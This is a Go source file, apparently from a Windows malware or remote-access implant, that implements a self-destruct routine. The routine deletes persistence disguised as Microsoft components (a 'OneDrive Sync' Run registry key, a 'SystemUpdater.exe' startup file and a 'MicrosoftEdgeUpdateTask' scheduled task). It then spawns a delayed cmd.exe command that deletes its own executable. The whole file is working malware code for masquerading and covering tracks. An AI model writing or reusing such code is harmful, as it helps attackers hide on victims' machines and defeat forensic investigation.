package handlers

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func SelfDestruct() string {
	exePath, err := os.Executable()
	if err != nil {
		return "❌ FATAL ERROR: Could not obtain executable path for self-destruction."
	}
	var results []string
	results = append(results, removeRegistryKey())
	results = append(results, removeStartupFile())
	results = append(results, removeScheduledTask())
	results = append(results, "---")
	results = append(results, "✅ Persistence traces removed.")
	deleterCmd := fmt.Sprintf("ping 127.0.0.1 -n 4 > nul && del /f /q \"%s\"", exePath)
	cmd := exec.Command("cmd.exe", "/C", deleterCmd)
	cmd.Start() 
	results = append(results, "💥 SELF-DESTRUCTION INITIATED! Process will terminate in 3 seconds.")
	return strings.Join(results, "\n")
}

func removeRegistryKey() string {
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		return fmt.Sprintf("⚠️ Registry: Could not open key (%v)", err)
	}
	defer key.Close()
	err = key.DeleteValue("OneDrive Sync")
	if err != nil {
		return fmt.Sprintf("⚠️ Registry: Could not delete value (%v)", err)
	}
	return "✅ Registry: 'OneDrive Sync' key deleted."
}

func removeStartupFile() string {
	startupPath, err := windows.KnownFolderPath(windows.FOLDERID_Startup, 0)
	if err != nil {
		return fmt.Sprintf("⚠️ Startup: Could not obtain path (%v)", err)
	}
	filePath := filepath.Join(startupPath, "SystemUpdater.exe")
	err = os.Remove(filePath)
	if err != nil {
		return fmt.Sprintf("⚠️ Startup: Could not delete file (%v)", err)
	}
	return "✅ Startup: 'SystemUpdater.exe' file deleted."
}

func removeScheduledTask() string {
	taskName := "MicrosoftEdgeUpdateTask"
	cmd := exec.Command("schtasks", "/Delete", "/TN", taskName, "/F")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("⚠️ Scheduled Task: Deletion failed (%v): %s", err, string(output))
	}
	return "✅ Scheduled Task: 'MicrosoftEdgeUpdateTask' task deleted."
}